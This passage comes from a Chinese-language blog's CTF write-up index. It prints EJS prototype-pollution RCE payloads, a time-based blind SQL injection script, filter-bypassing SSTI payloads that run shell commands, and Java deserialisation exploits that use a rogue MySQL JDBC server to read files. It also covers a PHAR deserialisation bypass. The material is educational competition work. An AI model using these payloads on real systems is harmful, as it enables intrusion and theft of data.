class=\"string\">&quot;$0&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>tips：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;id&#39;);&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\t&quot;constructor&quot;: &#123;</span><br><span class=\"line\">\t\t&quot;prototype&quot;: &#123;</span><br><span class=\"line\">\t\t\t&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;id&#39;);&quot;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;constructor&#x2F;prototype&#x2F;outputFunctionName&quot;: &quot;a; return global.process.mainModule.constructor._load(\\&quot;child_process\\&quot;).execSync(\\&quot;xxx\\&quot;); &#x2F;&#x2F;&quot;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"popsql\"><a href=\"#popsql\" class=\"headerlink\" title=\"popsql\"></a>popsql</h1><ul>\n<li>benchmark延时注入</li>\n<li>sys.x$statement_analysis读列名</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#sys.schema_table_statistics </span></span><br><span class=\"line\"><span class=\"comment\">#sys.x$statement_analysis Fl49ish3re.f1aG123</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">flag=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">9999</span>):</span><br><span class=\"line\">    print(a)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">30</span>,<span class=\"number\">130</span>):</span><br><span class=\"line\">        payload=(<span class=\"string\">&quot;&#x27; or if((select STRCMP(hex(right((select (f1aG123) from Fl49ish3re),&quot;</span>+<span class=\"built_in\">str</span>(a)+<span class=\"string\">&quot;)),&#x27;&quot;</span>+<span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(i))[<span class=\"number\">2</span>:]+flag+<span class=\"string\">&quot;&#x27;)),1,benchmark(9999999,md5(&#x27;test&#x27;)))#&quot;</span>).replace(<span class=\"string\">&quot; &quot;</span>,<span class=\"string\">&quot;/**/&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"comment\">#UPDATE `Fl49ish3re` SET `f1aG123` = ? WHERE `f1aG123` = ?</span></span><br><span class=\"line\">            <span class=\"comment\">#Fl49ish3re</span></span><br><span class=\"line\">            <span class=\"comment\">#users,Fl49ish3re</span></span><br><span class=\"line\">            r=requests.post(url=<span class=\"string\">&quot;&lt;http://172.52.31.84/index.php&quot;</span>,data=&#123;<span class=\"string\">&quot;username&quot;</span>:<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;password&gt;&quot;</span>:payload&#125;,timeout=<span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"comment\">#print(r.text)</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            flag=<span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(i))[<span class=\"number\">2</span>:]+flag</span><br><span class=\"line\">            print(payload)</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"没有人比我更懂py\"><a href=\"#没有人比我更懂py\" class=\"headerlink\" title=\"没有人比我更懂py\"></a>没有人比我更懂py</h1><ul>\n<li>SSTI</li>\n</ul>\n<p>全角绕过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">data&#x3D;&#123;&#123;［］.＿＿ｃｌａｓｓ＿＿．＿＿ｂａｓｅ＿＿．＿＿ｓｕｂｃｌａｓｓｅｓ＿＿（）［９９］［＇ｇｅｔ＿ｄａｔａ＇］（０，＇／ｆｌａｇ＇）&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>八进制绕过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[&#39;\\&#39;class\\&#39;][\\&#39;mro\\&#39;][1]\\&#39;subclasses\\&#39;[213][\\&#39;init\\&#39;][\\&#39;globals\\&#39;][\\&#39;builtins\\&#39;][\\&#39;eval\\&#39;](\\&#39;import(&quot;o&quot;+&quot;s&quot;).popen(&quot;cat &#x2F;*&quot;).read()\\&#39;&#39;]</span><br><span class=\"line\"></span><br><span class=\"line\">data&#x3D;&#123;&#123;()[&#39;\\137\\137\\143\\154\\141\\163\\163\\137\\137&#39;][&#39;\\137\\137\\155\\162\\157\\137\\137&#39;][1][&#39;\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137&#39;]()[213][&#39;\\137\\137\\151\\156\\151\\164\\137\\137&#39;][&#39;\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137&#39;][&#39;\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137&#39;][&#39;\\145\\166\\141\\154&#39;](&#39;\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\050\\042\\157\\042\\053\\042\\163\\042\\051\\056\\160\\157\\160\\145\\156\\050\\042\\143\\141\\164\\040\\057\\052\\042\\051\\056\\162\\145\\141\\144\\050\\051&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>flag: flag{48mKeDyOp5Tc2io0nTTJRsYWH8arLX7k}</p>\n<h1 id=\"NoRce\"><a href=\"#NoRce\" class=\"headerlink\" title=\"NoRce\"></a>NoRce</h1><ul>\n<li>二次反序列化</li>\n</ul>\n<p><del>MyBean#toString-&gt;Connect#connect-&gt;jdbc反序列化</del></p>\n<p>反序列化禁用了<code>com.example.demo.bean.Connect和java.security.*</code></p>\n<p>二次反序列化绕过</p>\n<p><a href=\"http://tttang.com/archive/1701/#toc_rmiconnector\">http://tttang.com/archive/1701/#toc_rmiconnector</a></p>\n<p>二次反序列化。<code>BadAttributeValueExpException</code>到<code>MyBean</code>的tostring，然后到Connect触发jdbc</p>\n<p>roguemysql netdoc列目录。读文件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.example.demo.bean.Connect;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.example.demo.bean.MyBean;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.example.demo.utils.MyObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.example.demo.utils.tools;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.management.BadAttributeValueExpException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Arrays;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashSet;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">exp</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> NoSuchFieldException, ClassNotFoundException, IllegalAccessException, IOException </span>&#123;</span><br><span class=\"line\">        Connect c = <span class=\"keyword\">new</span> Connect(<span class=\"string\">&quot;jdbc:mysql://10.92.85.6:3306/jdbc?allowLoadLocalInfile=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">        MyBean my = <span class=\"keyword\">new</span> MyBean(<span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;&quot;</span>, c);</span><br><span class=\"line\">        BadAttributeValueExpException poc = <span class=\"keyword\">new</span> BadAttributeValueExpException(<span class=\"number\">1</span>);</span><br><span class=\"line\">        Field val = Class.forName(<span class=\"string\">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class=\"string\">&quot;val&quot;</span>);</span><br><span class=\"line\">        val.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        val.set(poc, my);</span><br><span class=\"line\"></span><br><span class=\"line\">        ByteArrayOutputStream byteArrayOutputStream = <span class=\"keyword\">new</span> ByteArrayOutputStream();  <span class=\"comment\">// 本体</span></span><br><span class=\"line\">        ObjectOutputStream objectOutputStream = <span class=\"keyword\">new</span> ObjectOutputStream(byteArrayOutputStream); <span class=\"comment\">// 只是一个装饰器的作用 Filter模式，懂？</span></span><br><span class=\"line\">        objectOutputStream.writeObject(poc);</span><br><span class=\"line\">        objectOutputStream.close();</span><br><span class=\"line\">        String data = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class=\"line\"></span><br><span class=\"line\">        InputStream inputStream = <span class=\"keyword\">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());</span><br><span class=\"line\">        ObjectInputStream objectInputStream = <span class=\"keyword\">new</span> ObjectInputStream(inputStream);</span><br><span class=\"line\">        System.out.println(data);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.example.demo.bean.Connect;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.example.demo.bean.MyBean;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.example.demo.utils.MyObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.example.demo.utils.tools;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.management.BadAttributeValueExpException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.management.remote.JMXServiceURL;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Arrays;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashSet;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">exp2</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setField</span><span class=\"params\">(Object obj, String field, Object value)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        Field f = obj.getClass().getDeclaredField(field);</span><br><span class=\"line\">        f.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        f.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        JMXServiceURL jmxServiceURL = <span class=\"keyword\">new</span> JMXServiceURL(<span class=\"string\">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class=\"line\">        setField(jmxServiceURL, <span class=\"string\">&quot;urlPath&quot;</span>, <span class=\"string\">&quot;/stub/rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAEnQAA2V4cHQACGV4cC5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB+ABV4c3IAHGNvbS5leGFtcGxlLmRlbW8uYmVhbi5NeUJlYW4BFaoXHFZFKQIAA0wABGNvbm50ACZMamF2YXgvbWFuYWdlbWVudC9yZW1vdGUvSk1YQ29ubmVjdG9yO0wAB21lc3NhZ2VxAH4AAUwAA3VybHEAfgABeHBzcgAdY29tLmV4YW1wbGUuZGVtby5iZWFuLkNvbm5lY3RHjtzGNSsWrgIAA0wABG5hbWVxAH4ABUwACHBhc3N3b3JkcQB+AAVMAAN1cmxxAH4ABXhwdAAAcQB+ABt0AG5qZGJjOm15c3FsOi8vMTAuOTIuODUuNjozMzA2L2pkYmM/YWxsb3dMb2FkTG9jYWxJbmZpbGU9dHJ1ZSZtYXhBbGxvd2VkUGFja2V0PTY1NTM2MCZhbGxvd1VybEluTG9jYWxJbmZpbGU9dHJ1ZXEAfgAbcQB+ABs=&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        RMIConnector rmiConnector = <span class=\"keyword\">new</span> RMIConnector(jmxServiceURL, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        MyBean my = <span class=\"keyword\">new</span> MyBean(<span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;&quot;</span>, rmiConnector);</span><br><span class=\"line\">        BadAttributeValueExpException poc = <span class=\"keyword\">new</span> BadAttributeValueExpException(<span class=\"number\">1</span>);</span><br><span class=\"line\">        Field val = Class.forName(<span class=\"string\">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class=\"string\">&quot;val&quot;</span>);</span><br><span class=\"line\">        val.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        val.set(poc, my);</span><br><span class=\"line\"></span><br><span class=\"line\">        ByteArrayOutputStream byteArrayOutputStream = <span class=\"keyword\">new</span> ByteArrayOutputStream();  <span class=\"comment\">// 本体</span></span><br><span class=\"line\">        ObjectOutputStream objectOutputStream = <span class=\"keyword\">new</span> ObjectOutputStream(byteArrayOutputStream); <span class=\"comment\">// 只是一个装饰器的作用 Filter模式，懂？</span></span><br><span class=\"line\">        objectOutputStream.writeUTF(<span class=\"string\">&quot;cb2a2fbd&quot;</span>);</span><br><span class=\"line\">        objectOutputStream.writeObject(poc);</span><br><span class=\"line\">        objectOutputStream.close();</span><br><span class=\"line\">        String data = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class=\"line\">        <span class=\"comment\">//byte[] bytes = tools.base64Decode(data);</span></span><br><span class=\"line\">        InputStream inputStream = <span class=\"keyword\">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());</span><br><span class=\"line\">        ObjectInputStream objectInputStream = <span class=\"keyword\">new</span> MyObjectInputStream(inputStream);</span><br><span class=\"line\">        String secret = data.substring(<span class=\"number\">0</span>, <span class=\"number\">6</span>);</span><br><span class=\"line\">        String key = objectInputStream.readUTF();</span><br><span class=\"line\">        System.out.println(key);</span><br><span class=\"line\">        System.out.println(secret);</span><br><span class=\"line\">        System.out.println(data);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (key.hashCode() == secret.hashCode() &amp;&amp; !secret.equals(key)) &#123;</span><br><span class=\"line\">            objectInputStream.readObject();</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;oops&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;incorrect key&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n","categories":["赛题wp"]},{"title":"两道phar题","url":"/2023/12/25/phar/","content":"<h1 id=\"两道phar题目\"><a href=\"#两道phar题目\" class=\"headerlink\" title=\"两道phar题目\"></a>两道phar题目</h1><a id=\"more\"></a>\n\n<h1 id=\"源码\"><a href=\"#源码\" class=\"headerlink\" title=\"源码\"></a>源码</h1><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NSS</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$pass</span>=<span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;   </span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;pass===<span class=\"literal\">true</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> getenv(<span class=\"string\">&quot;FLAG&quot;</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;no permission&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;pass = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    session_start();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;filename&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> file_get_contents(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;filename&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$whtie_list</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;jpg&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$ext</span> = explode(<span class=\"string\">&quot;.&quot;</span>,<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;name&quot;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$ext</span> = end(<span class=\"variable\">$ext</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(in_array(<span class=\"variable\">$ext</span>,<span class=\"variable\">$whtie_list</span>))&#123;</span><br><span class=\"line\">            <span class=\"variable\">$img_info</span> = @getimagesize(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;tmp_name&quot;</span>]);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$img_info</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"variable\">$img_info</span>[<span class=\"number\">0</span>]&lt;=<span class=\"number\">20</span> &amp;&amp; <span class=\"variable\">$img_info</span>[<span class=\"number\">1</span>]&lt;=<span class=\"number\">20</span>)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(!is_dir(<span class=\"string\">&quot;upload/&quot;</span>.session_id().<span class=\"string\">&quot;/&quot;</span>))&#123;</span><br><span class=\"line\">                        mkdir(<span class=\"string\">&quot;upload/&quot;</span>.session_id().<span class=\"string\">&quot;/&quot;</span>);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"variable\">$content</span> = file_get_contents(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;tmp_name&quot;</span>]);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&quot;/php/i&quot;</span>,<span class=\"variable\">$content</span>))&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;hacker!!!&quot;</span>);</span><br><span class=\"line\">                    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                        move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;tmp_name&quot;</span>],<span class=\"string\">&quot;upload/&quot;</span>.session_id().<span class=\"string\">&quot;/&quot;</span>.<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;name&quot;</span>]);</span><br><span class=\"line\">                        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;upload success!! upload/your_sessionid/your_filename&quot;</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;image hight and width must less than 20&quot;</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&quot;invalid file head&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;invalid file extension!jpg only!!&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;wellcome!&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>一个文件上传题目，很明显就是phar反序列化了，需要注意的几个点吧</p>\n<ul>\n<li>getimagesize 控制宽高</li>\n<li>内容不允许php</li>\n<li>__wakeup()绕过</li>\n<li>phar文件的签名计算</li>\n</ul>\n<h1 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\"绕过\"></a>绕过</h1><h2 id=\"getimagesize\"><a href=\"#getimagesize\" class=\"headerlink\" title=\"getimagesize\"></a>getimagesize</h2><p>题目要求控制宽和高，也就是数组的前两个，上传的文件有这两个就行了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#define xlogo_width 20</span><br><span class=\"line\">#define xlogo_height 20</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"php字段\"><a href=\"#php字段\" class=\"headerlink\" title=\"php字段\"></a>php字段</h2><p>网上的生成phar文件的脚本都是</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> Phar(<span class=\"string\">&#x27;test.phar&#x27;</span>,<span class=\"number\">0</span>,<span class=\"string\">&#x27;test.phar&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;startBuffering();</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;setStub(<span class=\"string\">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;setMetadata(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;addFromString(<span class=\"string\">&#x27;text.txt&#x27;</span>,<span class=\"string\">&#x27;test&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>\n\n<p>实际上，跟踪php源码之后发现格式是这样的 <code>__HALT_COMPILER(); ?&gt;</code> 是必须的，剩下随意</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">xxx __HALT_COMPILER(); ?&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"wakeup\"><a href=\"#wakeup\" class=\"headerlink\" title=\"__wakeup()\"></a>__wakeup()</h2><p>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">O:6:&quot;sercet&quot;:1: 也就是输入比1大的值就行  如O:6:&quot;sercet&quot;:2:</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"签名计算\"><a href=\"#签名计算\" class=\"headerlink\" title=\"签名计算\"></a>签名计算</h2><p>在生成phar文件时，会对文件进行签名计算，如果对文件内容进行更改(比如这题，需要更改属性个数)，那么签名就会错误会显示</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E9%9A%8F%E6%89%8B%2Fimage-20220514181342030.png\" alt=\"image-20220514181342030\"></p>\n<p>所以需要重新计算签名</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> sha1</span><br><span class=\"line\"></span><br><span class=\"line\">file = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;test.phar&quot;</span>,<span class=\"string\">&quot;rb&quot;</span>).read()</span><br><span class=\"line\">text = file[:-<span class=\"number\">28</span>]  <span class=\"comment\">#读取开始到末尾除签名外内容</span></span><br><span class=\"line\">last = file[-<span class=\"number\">8</span>:]   <span class=\"comment\">#读取最后8位的GBMB和签名flag</span></span><br><span class=\"line\">new_file = text+sha1(text).digest() + last  <span class=\"comment\">#生成新的文件内容，主要是此时Sha1正确了。</span></span><br><span class=\"line\"><span class=\"built_in\">open</span>(<span class=\"string\">&quot;new.jpg&quot;</span>,<span class=\"string\">&quot;wb&quot;</span>).write(new_file)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h1><p>生成phar文件</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NSS</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$pass</span>=<span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;   </span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;pass = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> NSS();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> Phar(<span class=\"string\">&#x27;test.phar&#x27;</span>,<span class=\"number\">0</span>,<span class=\"string\">&#x27;test.phar&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;startBuffering();</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;setStub(<span class=\"string\">&#x27;#define xlogo_width 20&#x27;</span>.<span class=\"string\">&quot;\\n&quot;</span>.<span class=\"string\">&#x27;#define xlogo_height 20&#x27;</span>.<span 